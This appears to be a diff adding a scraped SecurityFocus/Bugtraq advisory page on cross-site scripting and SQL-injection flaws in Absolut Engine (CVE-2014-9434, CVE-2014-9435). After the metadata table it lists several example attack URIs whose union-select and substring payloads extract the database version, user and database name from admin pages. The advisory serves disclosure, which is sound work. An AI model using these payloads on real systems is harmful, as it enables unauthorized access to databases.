@@ -1,0 +1,97 @@
+#SpeeDr00t@Black Falcon<br>#bid71822<p><b><span style="font-size: 18pt;">Absolut Engine Cross Site Scripting and Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/71822/info">info</a><br><a href="http://www.securityfocus.com/bid/71822/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/71822/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/71822/solution">solution</a><br><a href="http://www.securityfocus.com/bid/71822/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				71822
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2014-9435<br/>
+				
+					CVE-2014-9434<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 30 2014 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 12 2015 03:01AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Steffen Rosemann
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit the SQL-injection issues. An attacker must trick a victim into following a malicious URI to exploit a cross-site scripting issue.              <br/> <br/>The following example URIs are available:        <br/> <br/> http://www.example.com/admin/managersection.php?&amp;amp;username=admin&amp;amp;session=c8d7ebc95b9b1a72d3b54eb59bea56c7&amp;amp;sectionID=1%27+and+1=2+union+select+1,version%28%29,3,4,5,6+--+*  <br/> <br/>http://www.example.com/admin/edituser.php?username=admin&amp;amp;session=c8d7ebc95b9b1a72d3b54eb59bea56c7&amp;amp;userID=3%27+and+1=2+union+select+1,user%28%29,3,version%28%29,5,database%28%29,7,8,9+--+*  <br/> <br/>http://www.example.com/admin/admin.php?username=admin%27+and+substring%28user%28%29,1,4%29=%27root%27+--+&amp;amp;session=c8d7ebc95b9b1a72d3b54eb59bea56c7*  <br/> <br/>http://www.example.com/admin/managerrelated.php?username=user&amp;amp;session=ae29000d8570273c8917e874d029b336&amp;amp;articleID=0&amp;amp;title={some_title}%27+and+1=2+union+select+1,version%28%29,3,4,5,6,7,8,9,10,11,12+--+*
+	
+		<ul>
+</ul>
+</div>
